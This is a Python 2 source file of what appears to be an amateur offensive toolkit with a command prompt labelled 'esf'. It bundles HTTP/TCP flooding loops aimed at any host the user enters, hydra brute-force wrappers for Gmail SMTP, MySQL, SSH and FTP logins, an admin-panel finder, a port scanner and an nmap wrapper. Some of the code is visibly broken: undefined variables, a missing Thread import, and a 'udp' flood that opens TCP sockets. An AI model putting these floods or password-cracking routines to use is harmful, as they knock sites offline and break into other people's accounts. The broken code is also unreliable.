#!/usr/bin/env python2
import os
import time
import sys
import urllib
import socket
import random
import string
import urlparse
import re
import subprocess
import tqdm

from wifibanners import *
from colors import *
from urllib2 import Request, urlopen, URLError, HTTPError

def adminpanel():
	f = open("link.txt","r");
	link = raw_input(BOLD+U+R+"esf"+W+"/admin/panel"+W+BOLD+" >  "+W)
	print "\n\nAvilable links : \n"
	while True:
		sub_link = f.readline()
		if not sub_link:
			break
		req_link = "http://"+link+"/"+sub_link
		req = Request(req_link)
		try:
			response = urlopen(req)
		except HTTPError as e:
			continue
		except URLError as e:
			continue
		else:
			print U + "Link" + W + "=> ",req_link


def dos2():
   def HTTP():
      try:
         sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         host = socket.gethostbyname(host1)
         port1 = random.randint(1, 1024)
         port2 = random.randint(1, 65535)
         sock1.connect((host, port1))
         sock2.connect((host, port2))
         print ("%s" % time.strftime("\033[32m[%H:%M:%S]:\033[0m")) + (" flooding to :  host|%s|" % (host))
         sock1.send("GET / {} HTTP/1.1\r\n {} \r\n".format(packet, user_agent))
         sock1.send("HOST: " + host + "\r\n\r\n" + user_agent + "\r\n");
         sock2.send("GET / {} HTTP/1.1\r\n {} \r\n".format(packet, user_agent))
         sock2.send("HOST: " + host + "\r\n\r\n" + user_agent + "\r\n");
         sock1.close()
         sock2.close()
      except socket.error as (msg):
         print (str(msg))
         print R + "#" * 47 + W
         dos2()
      except KeyboardInterrupt:
         print ("connection stopped")
         dos2()
   def HTTPS():
      try:
         sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         host = socket.gethostbyname(host2)
         port1 = random.randint(1, 1024)
         port2 = random.randint(1, 65535)
         sock1.connect((host, port1))
         sock2.connect((host, port2))
         print ("%s" % time.strftime("\033[32m[%H:%M:%S]:\033[0m")) + (" flooding to :  host|%s|" % (host))
         sock1.send("GET / {} HTTPS/1.1\r\n\ {} \r\n".format(packet, user_agent))
         sock1.send("HOST: " + host2 + "\r\n\r\n" + user_agent + "\r\n");
         sock2.send("GET / {} HTTPS/1.1\r\n\ {} \r\n".format(packet, user_agent))
         sock2.send("HOST: " + host2 + "\r\n\r\n" + user_agent + "\r\n");
         sock1.close()
         sock2.close()
      except socket.error as (msg):
         print (str(msg))
         print R + "#" * 47 + W
         dos2()
  
      except KeyboardInterrupt:
         print ("connection stopped")
         dos2()
  
   user_agent = ("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-us; Silk/1.1.0-80) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16 Silk-Accelerated=true")
   user_agent = ("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
   user_agent = ("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
   user_agent = ("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
   user_agent = ("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
   user_agent = ("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
   user_agent = ("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
   user_agent = ("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
   print (R+"\nwhat web security do you want to attack [http/https]\n"+W)
   dos = raw_input(BOLD+U+R+"esf"+W+"/dos2"+W+BOLD+" >  "+W)
   if dos == 'http' or dos == 'HTTP':
       print ("\nplease enter an host (eg. site.com)\n ")
       host1 = raw_input(BOLD+U+R+"esf"+W+"/dos2"+W+BOLD+" >  "+W)
       print R + ("\n") + ("how many packets\n") + W
       packet = raw_input(BOLD+U+R+"esf"+W+"/dos2"+W+BOLD+" >  "+W)
       print ("\n|hit enter to start|\n")
       starter = raw_input(BOLD+U+R+"esf"+W+"/dos2"+W+BOLD+" >  "+W)
       print R + "=" * 47
       print ("starting")
       print G + "#" * 47
       for x in range(1, 999999):
          HTTP()


   elif dos == 'https' or dos == 'HTTPS':
       print ("\nplease enter an host (eg. site.com)\n ")
       host2 = raw_input(BOLD+U+R+"esf"+W+"/dos2"+W+BOLD+" >  "+W)
       print R + ("\n") + ("how many packets\n") + W
       packet = raw_input(BOLD+U+R+"esf"+W+"/dos2"+W+BOLD+" >  "+W)
       print ("\n|hit enter to start|\n")
       starter2 = raw_input(BOLD+U+R+"esf"+W+"/dos2"+W+BOLD+" >  "+W)
       print R + "=" * 47
       print ("starting")
       print G + "#" * 47
       for x in range(1, 999999):
          HTTPS()
   elif dos == 'exit':
       print ("\nkilling all process")
       for i in tqdm.tqdm(range(1000)):
          time.sleep(0.01)
       print ("framework shutdown")
   else:
       print R + ("unknown command") + W
       dos2()

# PORT SCANNER

def portscanner():
    print ("warning this framework is too wild, can break user screen design")
    print ("|") + G + ("port scanner") + W + ("|")
    print ("\n|framework| [msg] : enter target |ip| or |Web address|")
    host = raw_input(BOLD+U+R+"esf"+W+"/portscanner"+W+BOLD+" >  "+W)
    print ("\n|framework| [msg] : start scanning port in...")
    from_port = input(BOLD+U+R+"esf"+W+"/portscanner"+W+BOLD+" >  "+W)
    print ("\n|framework| [msg] : port scanning will end in...")
    to_port = input(BOLD+U+R+"esf"+W+"/portscanner"+W+BOLD+" >  "+W)
    counting_open = []
    counting_close = []
    threads = []
    def scan(port):
      try:
       	s = socket.socket()
       	result = s.connect_ex((host,port))
       	print R + ("[=]xxxxxxxxxxxxxxxxxxxxxxxxxxxxx[=]")
       	print O + ('[:] |working on port| :   '+(str(port))) + W      
       	if result == 0:
	       	counting_open.append(port)
	       	#print((str(port))+' -> open') 
       		s.close()
       	else:
       		counting_close.append(port)
	       	#print((str(port))+' -> close') 
       		s.close()
      except socket.error as (msg):
        print G + "=" * 47
        print (str(msg))
        print R + "#" * 47 + W
        print O ("framework shutdown")
   
    for i in range(from_port, to_port+1):
    	t = Thread(target=scan, args=(i,))
    	threads.append(t)
    	t.start()
	
    [x.join() for x in threads]

    print(counting_open)

# GMAIL BRUTEFORCE
def gmailbrute():
   print ("|\033[1;32mhydra gmail brute\033[0;0m|")
   email = raw_input(BOLD+U+R+"esf"+W+"/email"+W+BOLD+" >  "+W)
   word = raw_input(BOLD+U+R+"esf"+W+"/wordlist"+W+BOLD+" >  "+W)
   print G + "=" * 47 + W
   print ("|") + G + ("cracking...") + W + ("|")
   os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
   print R + "#" * 47 + W
  


# MYSQL BRUTEFORCE

def mysqlbrute():
   print ("|\033[1;32mhydra mysql brute\033[0;0m|")
   user = raw_input(BOLD+U+R+"esf"+W+"/user"+W+BOLD+" >  "+W)
   word = raw_input(BOLD+U+R+"esf"+W+"/wordlist"+W+BOLD+" >  "+W)
   print G + "=" * 47 + W
   print ("|") + G + ("cracking...") + W + ("|")
   os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
   print R + "#" * 47 + W
  

# SSH BRUTEFORCE

def sshbrute():
   print ("|\033[1;32mhydra ssh brute\033[0;0m|")
   user = raw_input(BOLD+U+R+"esf"+W+"/user"+W+BOLD+" >  "+W)
   list = raw_input(BOLD+U+R+"esf"+W+"/wordlist"+W+BOLD+" >  "+W)
   iphost = raw_input(BOLD+U+R+"esf"+W+"/ip/hostname"+W+BOLD+" >  "+W)
   print G + "=" * 47 + W
   print ("|") + G + ("cracking...") + W + ("|")
   os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
   print R + "#" * 47 + W

# FTP BRUTEFORCE

def ftpbrute():
   print ("|\033[1;32mhydra ftpbrute\033[0;0m|")
   user = raw_input(BOLD+U+R+"esf"+W+"/user"+W+BOLD+" >  "+W)
   iphost = raw_input(BOLD+U+R+"esf"+W+"/ip/hostname"+W+BOLD+" >  "+W)
   list = raw_input(BOLD+U+R+"esf"+W+"/wordlist"+W+BOLD+" >  "+W)
   print G + "=" * 47 + W
   print ("|") + G + ("cracking...") + W + ("|")
   os.system("hydra -l %s -P %s %s ftp" % (user, word, iphost))
   print R + "#" * 47 + RESET

# NMAP SCANNER FRAMEWORK

def nmap():
   print R + ("|note| :  need to install nmap") + W
   print G + ("enter your arguments and site link") + W
   print ("\n|usage| :  -sn [link]")
   mapper = raw_input(BOLD+U+R+"esf"+W+"/nmap/scanner"+W+BOLD+" >  "+W)
   os.system("nmap %s" % (mapper))
 
# DOS TOOL

def dos():
    def webkiller():
      try:
        set1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        set2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        serverIP = socket.gethostbyname(targetsite)
        port1 = random.randint(1, 1024)
        port2 = random.randint(1, 65535)
        set1.connect((targetsite, port1))
        set2.connect((targetsite, port2))
        print ("%s" % time.strftime("\033[32m[%H:%M:%S]:\033[0m")) + ("%s packet sent :  {} packets".format(packet))
        set1.send("GET / {} HTTP/1.1\r\n {} \r\n".format(packet, user_agent))
        set1.send("HOST: " + targetsite + "\r\n\r\n" + user_agent + "\r\n");
        set2.send("GET / {} HTTP/1.1\r\n {} \r\n".format(packet, user_agent))
        set2.send("HOST: " + targetsite + "\r\n\r\n" + user_agent + "\r\n");
        set1.close()
        set2.close()
      except socket.error as (msg):
        print "-" * 47 + R
        print (str(msg))
        print W + "-" * 47
     
      except KeyboardInterrupt:
        print ""
        print "-" * 47 + R
        print ("User Shutdown")
        print W + "-" * 47
     
    user_agent = ("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-us; Silk/1.1.0-80) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16 Silk-Accelerated=true")
    user_agent = ("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    user_agent = ("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    user_agent = ("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    user_agent = ("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    user_agent = ("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    user_agent = ("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    user_agent = ("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    targetsite = raw_input(BOLD+U+R+"esf"+W+"/dos"+W+BOLD+" >  "+W)
    packet = input(BOLD+U+R+"esf"+W+"/dos"+W+BOLD+" >  "+W)
    print G + "-" * 47 
    print R + "-" * 47 + G
    print ("[:]sending packets to :  {}...".format(targetsite)) + W
    for x in range(1, 999999):
       webkiller()

# UDP TCP FLOODER

def udptcpflood():
   def udp():
     try:
       socket1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       target = socket.gethostbyname(site1)
       portudp = random.randint(1, 1024)
       socket1.connect((site1, portudp))
       print ("%s" % time.strftime("\033[32m[%H:%M:%S]:\033[0m")) + ("packet sent :  |port|:{} with {} packets".format(portudp, packets1))
       socket1.send("GET / {} HTTP/1.1\r\n {} \r\n".format(packets1, user_agent))
       socket1.send("HOST: " + site1 + "\r\n\r\n" + user_agent + "\r\n");
       socket1.close()
     except socket.error as (msg):
       print R + "#" * 47
       print G + (str(msg))
       print R + "=" * 47 + W
  
     except KeyboardInterrupt:
       print R + "#" * 47
       print G + ("framework shutdown")
       print R + "=" * 47 + W
    
   def tcp():
     try:
       socket2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       target = socket.gethostbyname(site2)
       porttcp = random.randint(1, 65535)
       socket2.connect((site2, porttcp))
       print ("%s" % time.strftime("\033[32m[%H:%M:%S]:\033[0m")) + (" packet sent :  |port|:{} with {} packets".format(porttcp, packets2))
       socket2.send("GET / {} HTTP/1.1\r\n {} \r\n".format(packets2, user_agent))
       socket2.send("HOST: " + site2 + "\r\n\r\n" + user_agent + "\r\n");
       socket.close()
     except socket.error as (msg):
       print R + "#" * 47
       print G + (str(msg))
       print R + "=" * 47 + W
   
     except KeyboardInterrupt:
       print R + "#" * 47
       print G + ("framework shutdown")
       print R + "=" * 47 + W
   
   user_agent = ("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-us; Silk/1.1.0-80) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16 Silk-Accelerated=true")
   user_agent = ("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
   user_agent = ("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
   user_agent = ("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
   user_agent = ("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
   user_agent = ("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
   user_agent = ("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
   user_agent = ("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
   user_agent = ("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-us; Silk/1.1.0-80) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16 Silk-Accelerated=true")
   print ("[1] :  udp\n[2] :  tcp")
   choice = raw_input(BOLD+U+R+"esf"+W+"/udp/tcp/flood"+W+BOLD+" >  "+W)
   if choice == '1':
     site1 = raw_input(BOLD+U+R+"esf"+W+"/host"+W+BOLD+" >  "+W)
     packets1 = input(BOLD+U+R+"esf"+W+"/packets"+W+BOLD+" >  "+W)
     print G + "=" * 47
     print R + ("[:]sending packets to :  {}...".format(site1)) + W
     print G + "#" * 47 + RESET
     for x in range(1, 999999):
       udp()

   if choice == '2':
     site2 = raw_input(BOLD+U+R+"esf"+W+"/host"+W+BOLD+" >  "+W)
     packets2 = input(BOLD+U+R+"esf"+W+"/packets"+W+BOLD+" >  "+W)
     print G + "=" * 47
     print R + ("[:]sending packets to :  {}...".format(site2)) + W
     print G + "#" * 47 + RESET
     for x in range(1, 999999):
       tcp()
   elif choice == 'exit':
     print("done process")
   else:
     print R + ("unknown command") + W
     print ("framework will restart\nplease wait...")
     udptcpflood()

# WEB INFO RETRIEVER

def webIP():
   def webip():
      try:
         global page,splithost,ip
         data = host#+'/'
         page = urllib.urlopen(data)
         source = page.read()
         splithost = str(data.split("://")[1].split("/")[0])
         ip = socket.gethostbyname(splithost)
         print ("\033[34m[:] \033[31muser screen will be cleared to start scanning\033[0m")
         time.sleep(9.9)
         os.system("clear")
         print wifi1
         time.sleep(1.01)
         os.system("clear")
         print wifi2
         time.sleep(1.01)
         os.system("clear")
         print wifi3
         time.sleep(1.01)
         os.system("clear")
         print wifi4
         print GR + "=" * 47
         print ("|"+G+"web IP"+W+"|")
         print ("URL :  %s\nIP  :  %s")%(data,ip)
         print GR + "=" * 47
         webIP()
      except(IOError):
         print("|"+R+"ERROR"+GR+"|\n"+GR+"\n*"+R+"check your ineternet connection\n"+W+"*"+R+"maybe the site is down\n"+W+"*"+R+"maybe the website have a high security\n"+W)
         webIP()
   global host
   print ("\n|http or https [http/https|\nplease type http if the website is http\ntype https if the website is https\n")
   host1 = raw_input(BOLD+U+R+"esf"+W+"/webIP"+W+BOLD+" >  "+W)
   if host1 == 'http':
      print("please enter the website link (eg. site.com)")
      host = raw_input(BOLD+U+R+"esf"+W+"/webIP"+W+BOLD+" >  "+W)
      if 'https://' in host:
         print bad + ("you enter a link with https cant get ip") + W
         pass
      elif 'http://' in host:
         print bad + ("you enter a link with http cant get ip") + W
         pass
      else:
         host = "http://"+host
         print("[+] please wait\n")
         webip()
   elif host1 == 'https':
      print("please enter the website link (eg. site.com)\n")
      host = raw_input(BOLD+U+R+"esf"+W+"/webIP"+W+BOLD+" >  "+W)
      if 'https://' in host:
         print bad + ("you enter a link with https cant get ip") + W
         pass
      elif 'http://' in host:
         print bad + ("you enter a link with http cant get ip") + W
         pass
      else:
         host = "https://"+host
         print("[+] please wait\n")
         time.sleep(2.5)
         webip()
   elif host1 == 'exit':
      print("user shutdown...")
   else:
      print("|%s| unknown command" % (host1))
      webIP()